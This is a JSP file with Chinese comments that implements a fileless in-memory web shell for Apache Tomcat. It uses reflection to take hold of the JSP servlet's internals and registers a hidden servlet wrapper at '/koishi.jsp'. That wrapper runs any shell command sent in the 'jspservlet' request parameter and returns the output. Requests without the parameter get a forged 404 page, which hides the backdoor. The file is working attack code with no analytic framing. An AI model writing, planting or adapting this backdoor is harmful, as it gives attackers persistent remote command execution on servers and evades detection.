<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@ page import="org.apache.jasper.Options" %>
<%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.jasper.compiler.Localizer" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.jasper.EmbeddedServletOptions" %>
<%@ page import="java.io.FileNotFoundException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    class MemJspServletWrapper extends JspServletWrapper {

        public MemJspServletWrapper(ServletConfig config, Options options, JspRuntimeContext rctxt) {
            super(config, options, "koishiAndCirno", rctxt); // jspUri随便取值
        }

        @Override
        public void service(HttpServletRequest request, HttpServletResponse response, boolean precompile) throws ServletException, IOException, FileNotFoundException, IOException {
            String cmd = request.getParameter("jspservlet");
            if (cmd != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")){
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = response.getWriter();
                out.println(output);
                out.flush();
                out.close();
            } else {
                // 伪造404页面
                String msg = Localizer.getMessage("jsp.error.file.not.found", new Object[]{"/tyskill.jsp"});
                response.sendError(404, msg);
            }
        }
    }
%>
<%
    //从request对象中获取request属性
    Field _request = request.getClass().getDeclaredField("request");
    _request.setAccessible(true);
    Request __request = (Request) _request.get(request);
    //获取MappingData
    MappingData mappingData = __request.getMappingData();
    //获取Wrapper
    Field _wrapper = mappingData.getClass().getDeclaredField("wrapper");
    _wrapper.setAccessible(true);
    Wrapper __wrapper = (Wrapper) _wrapper.get(mappingData);
    //获取jspServlet对象
    Field _jspServlet = __wrapper.getClass().getDeclaredField("instance");
    _jspServlet.setAccessible(true);
    Servlet __jspServlet = (Servlet) _jspServlet.get(__wrapper);
    // 获取ServletConfig对象
    Field _servletConfig = __jspServlet.getClass().getDeclaredField("config");
    _servletConfig.setAccessible(true);
    ServletConfig __servletConfig = (ServletConfig) _servletConfig.get(__jspServlet);
    //获取options中保存的对象
    Field _option = __jspServlet.getClass().getDeclaredField("options");
    _option.setAccessible(true);
    EmbeddedServletOptions __option = (EmbeddedServletOptions) _option.get(__jspServlet);
    // 获取JspRuntimeContext对象
    Field _jspRuntimeContext = __jspServlet.getClass().getDeclaredField("rctxt");
    _jspRuntimeContext.setAccessible(true);
    JspRuntimeContext __jspRuntimeContext = (JspRuntimeContext) _jspRuntimeContext.get(__jspServlet);
    JspServletWrapper memjsp = new MemJspServletWrapper(__servletConfig, __option, __jspRuntimeContext);

    __jspRuntimeContext.addWrapper("/koishi.jsp", memjsp);
%>
